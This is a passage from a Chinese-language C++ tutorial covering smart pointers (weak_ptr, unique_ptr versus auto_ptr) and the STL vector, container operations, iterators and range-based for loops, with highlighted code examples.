&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeA_weak&gt; pa = <span class="built_in">std</span>::make_shared&lt;NodeA_weak&gt;();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">shared_ptr</span>&lt;NodeB_weak&gt; pb = <span class="built_in">std</span>::make_shared&lt;NodeB_weak&gt;();</span><br><span class="line"></span><br><span class="line">    pa-&gt;ptrB = pb;</span><br><span class="line">    pb-&gt;ptrA = pa; <span class="comment">// pa 赋值给 weak_ptr，不增加 pa 的引用计数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pa use_count: &quot;</span> &lt;&lt; pa.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;pb use_count: &quot;</span> &lt;&lt; pb.use_count() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当 pa 和 pb 离开作用域时，引用计数都能降为 0，对象被正确销毁</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 输出 NodeA_weak destroyed 和 NodeB_weak destroyed</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-2-2-有关智能指针的注意事项"><a href="#16-2-2-有关智能指针的注意事项" class="headerlink" title="16.2.2 有关智能指针的注意事项"></a>16.2.2 有关智能指针的注意事项</h3><ul><li>  <strong>不要混用智能指针和原始指针:</strong> 避免将 <code>get()</code> 返回的原始指针传递给另一个智能指针或手动 <code>delete</code>。</li><li>  <strong>优先使用 <code>make_unique</code> 和 <code>make_shared</code>:</strong> 更安全、可能更高效。</li><li>  <strong><code>shared_ptr</code> 的性能开销:</strong> 引用计数是原子操作，在多线程环境下有一定开销。<code>shared_ptr</code> 对象本身也比 <code>unique_ptr</code> 或原始指针大（需要存储指向控制块的指针）。</li><li>  <strong><code>this</code> 指针问题:</strong> 不要在类的构造函数中将 <code>this</code> 指针直接传递给 <code>shared_ptr</code> 的构造函数。如果需要让类自身能够创建指向自己的 <code>shared_ptr</code>，应继承自 <code>std::enable_shared_from_this&lt;YourClass&gt;</code> 并使用 <code>shared_from_this()</code> 方法。</li></ul><h3 id="16-2-3-unique-ptr-为何优于-auto-ptr"><a href="#16-2-3-unique-ptr-为何优于-auto-ptr" class="headerlink" title="16.2.3 unique_ptr 为何优于 auto_ptr"></a>16.2.3 <code>unique_ptr</code> 为何优于 <code>auto_ptr</code></h3><p>C++98 引入了 <code>std::auto_ptr</code>，它是 <code>unique_ptr</code> 的前身，也试图实现独占所有权。但 <code>auto_ptr</code> 有一个严重的设计缺陷：它的<strong>复制构造函数</strong>和<strong>赋值运算符</strong>会<strong>转移所有权</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">auto_ptr</span>&lt;<span class="keyword">int</span>&gt; <span class="title">ap1</span><span class="params">(<span class="keyword">new</span> <span class="keyword">int</span>(<span class="number">10</span>))</span></span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">auto_ptr</span>&lt;<span class="keyword">int</span>&gt; ap2 = ap1; <span class="comment">// ！！所有权从 ap1 转移到 ap2，ap1 变为无效！！</span></span><br></pre></td></tr></table></figure><p>这种隐式的、破坏性的复制行为非常危险，尤其是在将 <code>auto_ptr</code> 放入容器或作为函数参数按值传递时，会导致意外的所有权丢失。</p><p>C++11 引入了移动语义，使得 <code>unique_ptr</code> 可以通过显式的 <code>std::move</code> 来安全地转移所有权，同时<strong>禁止</strong>了复制操作，从而避免了 <code>auto_ptr</code> 的问题。</p><p><strong><code>auto_ptr</code> 已在 C++11 中被废弃，并在 C++17 中被移除。应始终使用 <code>unique_ptr</code> 替代它。</strong></p><h3 id="16-2-4-选择智能指针"><a href="#16-2-4-选择智能指针" class="headerlink" title="16.2.4 选择智能指针"></a>16.2.4 选择智能指针</h3><ul><li>  <strong>默认选择 <code>std::unique_ptr</code>:</strong> 当你需要管理一个动态分配的资源，并且不需要共享其所有权时，<code>unique_ptr</code> 是最简单、最高效的选择。</li><li>  <strong>使用 <code>std::shared_ptr</code>:</strong> 当资源需要被多个所有者共享生命周期时（例如，在数据结构中多个部分可能引用同一个节点，或者回调函数需要确保某个对象在其执行期间存活）。</li><li>  <strong>使用 <code>std::weak_ptr</code>:</strong> 当你需要观察一个由 <code>shared_ptr</code> 管理的对象，但不想影响其生命周期时，特别是为了打破 <code>shared_ptr</code> 之间的循环引用。</li></ul><p>智能指针是现代 C++ 中管理动态资源的核心工具，极大地提高了代码的安全性和简洁性。</p><h2 id="16-3-标准模板库（STL）"><a href="#16-3-标准模板库（STL）" class="headerlink" title="16.3 标准模板库（STL）"></a>16.3 标准模板库（STL）</h2><p><strong>标准模板库 (Standard Template Library, STL)</strong> 是 C++ 标准库的一个重要组成部分，它提供了一套通用的模板类和函数，用于实现常用的数据结构和算法。STL 的核心思想是**泛型编程 (Generic Programming)**，即代码独立于特定的数据类型，可以应用于多种类型。</p><p>STL 主要由三个核心组件构成：</p><ol><li> <strong>容器 (Containers):</strong> 用于存储数据的模板类。例如 <code>vector</code>, <code>list</code>, <code>deque</code>, <code>set</code>, <code>map</code> 等。它们封装了数据结构，并提供了管理元素的方法。</li><li> <strong>算法 (Algorithms):</strong> 用于处理容器中数据的模板函数。例如 <code>sort</code>, <code>find</code>, <code>copy</code>, <code>for_each</code> 等。这些算法通常通过迭代器作用于容器中的元素范围。</li><li> <strong>迭代器 (Iterators):</strong> 行为类似于指针的对象，用于遍历容器中的元素，并作为连接容器和算法的桥梁。</li></ol><p>本节将重点介绍 STL 中最常用的容器之一：<code>vector</code>，以及适用于多种容器的通用操作。</p><h3 id="16-3-1-模板类-vector"><a href="#16-3-1-模板类-vector" class="headerlink" title="16.3.1 模板类 vector"></a>16.3.1 模板类 vector</h3><p><code>std::vector</code> 是一个模板类，定义在 <code>&lt;vector&gt;</code> 头文件中。它实现了一个**动态数组 (Dynamic Array)**，可以根据需要自动增长或收缩大小。</p><p><strong>特点:</strong></p><ul><li>  <strong>动态大小:</strong> 可以在运行时添加或删除元素，<code>vector</code> 会自动管理内存。</li><li>  <strong>随机访问:</strong> 支持通过索引 (<code>[]</code> 或 <code>at()</code>) 快速访问任何位置的元素，时间复杂度为 O(1)。</li><li>  <strong>连续存储:</strong> 元素在内存中是连续存储的，这使得通过指针或迭代器进行遍历非常高效，并能与需要连续内存的 C 风格 API 兼容。</li><li>  <strong>尾部插入/删除高效:</strong> 在末尾添加 (<code>push_back</code>) 或删除 (<code>pop_back</code>) 元素通常很高效（摊销时间复杂度为 O(1)）。</li><li>  <strong>中间插入/删除低效:</strong> 在中间或开头插入或删除元素可能需要移动后续所有元素，时间复杂度为 O(N)。</li></ul><p><strong>基本用法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt; // 包含 vector 头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建 vector 对象</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; scores; <span class="comment">// 创建一个空的 int 向量</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; <span class="title">lengths</span><span class="params">(<span class="number">10</span>)</span></span>; <span class="comment">// 创建包含 10 个 double 元素的向量，默认初始化为 0.0</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; <span class="title">names</span><span class="params">(<span class="number">5</span>, <span class="string">&quot;Unknown&quot;</span>)</span></span>; <span class="comment">// 创建包含 5 个 string 元素，都初始化为 &quot;Unknown&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用初始化列表 (C++11)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; vowels &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;u&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加元素到末尾</span></span><br><span class="line">    scores.push_back(<span class="number">95</span>);</span><br><span class="line">    scores.push_back(<span class="number">88</span>);</span><br><span class="line">    scores.push_back(<span class="number">76</span>); <span class="comment">// scores 现在是 &#123;95, 88, 76&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 访问元素</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First score: &quot;</span> &lt;&lt; scores[<span class="number">0</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 使用 []</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Second score: &quot;</span> &lt;&lt; scores.at(<span class="number">1</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 使用 at() (带边界检查)</span></span><br><span class="line">    scores[<span class="number">0</span>] = <span class="number">98</span>; <span class="comment">// 修改元素</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取大小</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of scores: &quot;</span> &lt;&lt; scores.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Number of names: &quot;</span> &lt;&lt; names.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出 5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-3-2-可对容器执行的操作"><a href="#16-3-2-可对容器执行的操作" class="headerlink" title="16.3.2 可对容器执行的操作"></a>16.3.2 可对容器执行的操作</h3><p>许多 STL 容器（包括 <code>vector</code>）都支持一组常见的操作：</p><ul><li>  <strong><code>size()</code>:</strong> 返回容器中元素的数量。类型通常是 <code>size_type</code> (一种无符号整型)。</li><li>  <strong><code>empty()</code>:</strong> 检查容器是否为空。如果 <code>size() == 0</code>，返回 <code>true</code>，否则返回 <code>false</code>。</li><li>  <strong><code>operator[]</code>:</strong> 通过索引访问元素（仅适用于 <code>vector</code>, <code>deque</code>, <code>string</code>, <code>array</code>）。<strong>不进行边界检查</strong>。</li><li>  <strong><code>at()</code>:</strong> 通过索引访问元素（仅适用于 <code>vector</code>, <code>deque</code>, <code>string</code>, <code>array</code>）。<strong>进行边界检查</strong>，越界时抛出 <code>std::out_of_range</code> 异常。</li><li>  <strong><code>front()</code>:</strong> 返回对第一个元素的引用。容器不能为空。</li><li>  <strong><code>back()</code>:</strong> 返回对最后一个元素的引用。容器不能为空。</li><li>  <strong><code>push_back(value)</code>:</strong> (仅适用于 <code>vector</code>, <code>deque</code>, <code>list</code>, <code>string</code>) 在容器末尾添加一个值为 <code>value</code> 的元素。</li><li>  <strong><code>pop_back()</code>:</strong> (仅适用于 <code>vector</code>, <code>deque</code>, <code>list</code>, <code>string</code>) 删除容器末尾的元素。容器不能为空。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdexcept&gt; // for out_of_range</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; data = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!data.empty()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size: &quot;</span> &lt;&lt; data.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Front: &quot;</span> &lt;&lt; data.front() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 1</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Back: &quot;</span> &lt;&lt; data.back() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;   <span class="comment">// 输出 3</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Element at index 1: &quot;</span> &lt;&lt; data[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data.push_back(<span class="number">4</span>); <span class="comment">// data: &#123;1, 2, 3, 4&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After push_back(4), back is: &quot;</span> &lt;&lt; data.back() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 4</span></span><br><span class="line"></span><br><span class="line">    data.pop_back(); <span class="comment">// data: &#123;1, 2, 3&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After pop_back(), back is: &quot;</span> &lt;&lt; data.back() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        data.at(<span class="number">1</span>) = <span class="number">20</span>; <span class="comment">// 修改第二个元素</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Element at index 1 (using at): &quot;</span> &lt;&lt; data.at(<span class="number">1</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 20</span></span><br><span class="line">        <span class="keyword">int</span> val = data.at(<span class="number">5</span>); <span class="comment">// 访问越界，将抛出异常</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">const</span> <span class="built_in">std</span>::out_of_range&amp; oor) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: &quot;</span> &lt;&lt; oor.what() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-3-3-对容器可执行的其他操作"><a href="#16-3-3-对容器可执行的其他操作" class="headerlink" title="16.3.3 对容器可执行的其他操作"></a>16.3.3 对容器可执行的其他操作</h3><p>除了基本操作，STL 容器还提供了其他一些有用的方法，其中许多涉及到**迭代器 (Iterators)**。迭代器是泛化的指针，用于指定容器中的位置或范围。</p><ul><li><p><strong>迭代器获取:</strong></p><ul><li>  <code>begin()</code>: 返回指向容器第一个元素的迭代器。</li><li>  <code>end()</code>: 返回指向容器<strong>末尾之后 (past-the-end)</strong> 位置的迭代器。它不指向任何有效元素，常用于标记范围的结束。</li><li>  <code>rbegin()</code>, <code>rend()</code>: 返回反向迭代器，用于从后向前遍历。</li><li>  <code>cbegin()</code>, <code>cend()</code>, <code>crbegin()</code>, <code>crend()</code> (C++11): 返回 <code>const</code> 迭代器，用于只读访问。</li></ul></li><li><p><strong>插入 (<code>insert()</code>):</strong> 在指定位置插入元素。需要一个指向插入位置的迭代器。</p><ul><li>  <code>insert(iterator pos, const value_type&amp; val)</code>: 在 <code>pos</code> 之前插入 <code>val</code>。返回指向新插入元素的迭代器。</li><li>  <code>insert(iterator pos, size_type n, const value_type&amp; val)</code>: 在 <code>pos</code> 之前插入 <code>n</code> 个 <code>val</code>。</li><li>  <code>insert(iterator pos, InputIt first, InputIt last)</code>: 在 <code>pos</code> 之前插入来自迭代器范围 <code>[first, last)</code> 的元素。</li></ul></li><li><p><strong>删除 (<code>erase()</code>):</strong> 删除指定位置或范围的元素。需要迭代器。</p><ul><li>  <code>erase(iterator pos)</code>: 删除 <code>pos</code> 指向的元素。返回指向被删除元素之后元素的迭代器。</li><li>  <code>erase(iterator first, iterator last)</code>: 删除范围 <code>[first, last)</code> 内的元素。返回指向最后一个被删除元素之后元素的迭代器。</li></ul></li><li><p>  <strong>清空 (<code>clear()</code>):</strong> 删除容器中的所有元素。<code>size()</code> 变为 0。</p></li><li><p>  <strong>交换 (<code>swap()</code>):</strong> <code>c1.swap(c2)</code> 或 <code>std::swap(c1, c2)</code>。高效地交换两个容器的内容。对于 <code>vector</code> 等容器，通常只交换内部指针和大小信息，速度很快。</p></li><li><p><strong>赋值 (<code>assign()</code>):</strong> 替换容器的全部内容。</p><ul><li>  <code>assign(size_type n, const value_type&amp; val)</code>: 赋值为 <code>n</code> 个 <code>val</code>。</li><li>  <code>assign(InputIt first, InputIt last)</code>: 赋值为来自迭代器范围 <code>[first, last)</code> 的元素。</li><li>  <code>assign(initializer_list&lt;value_type&gt; il)</code> (C++11): 从初始化列表赋值。</li></ul></li><li><p><strong>容量管理 (主要用于 <code>vector</code>, <code>string</code>, <code>deque</code>):</strong></p><ul><li>  <code>capacity()</code>: 返回当前已分配内存能够容纳的元素数量。</li><li>  <code>reserve(n)</code>: 请求将容量增加到至少 <code>n</code>。如果 <code>n</code> 大于当前容量，可能发生内存重新分配（这会导致所有迭代器、指针和引用失效）。</li><li>  <code>shrink_to_fit()</code> (C++11): 请求减少容量以匹配 <code>size()</code>。不保证一定减少。</li></ul></li></ul><p><strong>示例 (使用迭代器):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取迭代器</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator it = v.begin(); <span class="comment">// 指向 10</span></span><br><span class="line">    it += <span class="number">2</span>; <span class="comment">// 移动迭代器，指向 30 (vector 支持随机访问迭代器)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入</span></span><br><span class="line">    v.insert(it, <span class="number">25</span>); <span class="comment">// 在 30 之前插入 25。v: &#123;10, 20, 25, 30, 40, 50&#125;</span></span><br><span class="line">                      <span class="comment">// 注意：vector 插入可能导致迭代器失效，最好重新获取或使用返回的迭代器</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After insert: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除</span></span><br><span class="line">    it = v.begin() + <span class="number">1</span>; <span class="comment">// 指向 20</span></span><br><span class="line">    v.erase(it); <span class="comment">// 删除 20。v: &#123;10, 25, 30, 40, 50&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After erase(it): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    it = v.begin() + <span class="number">1</span>; <span class="comment">// 指向 25</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::iterator it_end = v.begin() + <span class="number">3</span>; <span class="comment">// 指向 40 (范围是 [it, it_end) )</span></span><br><span class="line">    v.erase(it, it_end); <span class="comment">// 删除 25, 30。v: &#123;10, 40, 50&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After erase(range): &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 assign</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">list</span>&lt;<span class="keyword">int</span>&gt; l = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>&#125;;</span><br><span class="line">    v.assign(l.begin(), l.end()); <span class="comment">// 用 list 的内容替换 vector 内容。v: &#123;100, 200, 300&#125;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After assign: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> x : v) <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    v.clear(); <span class="comment">// 清空 vector</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After clear, size is: &quot;</span> &lt;&lt; v.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-3-4-基于范围的-for-循环（C-11）"><a href="#16-3-4-基于范围的-for-循环（C-11）" class="headerlink" title="16.3.4 基于范围的 for 循环（C++11）"></a>16.3.4 基于范围的 for 循环（C++11）</h3><p>C++11 引入了一种更简洁、更不易出错的遍历容器（以及其他支持 <code>begin()</code> 和 <code>end()</code> 的序列）的方式：**基于范围的 for 循环 (Range-based for loop)**。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( declaration : range_expression ) &#123;</span><br><span class="line">    <span class="comment">// loop_statement</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>range_expression</code>: 一个可以提供 <code>begin()</code> 和 <code>end()</code> 迭代器的对象（如 STL 容器、数组、初始化列表，或定义了相应成员/非成员函数的自定义类型）。</li><li>  <code>declaration</code>: 声明一个变量，其类型应与 <code>range_expression</code> 中的元素类型兼容。每次循环迭代，<code>range_expression</code> 中的下一个元素会被<strong>复制</strong>或<strong>引用</strong>到这个变量中。</li></ul><p><strong>常用形式:</strong></p><ul><li><strong>只读访问 (推荐):</strong> 使用 <code>const auto&amp;</code> 避免不必要的复制，并确保不会意外修改元素。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; names = &#123;<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; name : names) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出: Alice Bob Charlie</span></span><br></pre></td></tr></table></figure></li><li><strong>修改元素:</strong> 使用 <code>auto&amp;</code> 获取元素的引用，允许在循环中修改容器内容。  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp; num : nums) &#123;</span><br><span class="line">    num 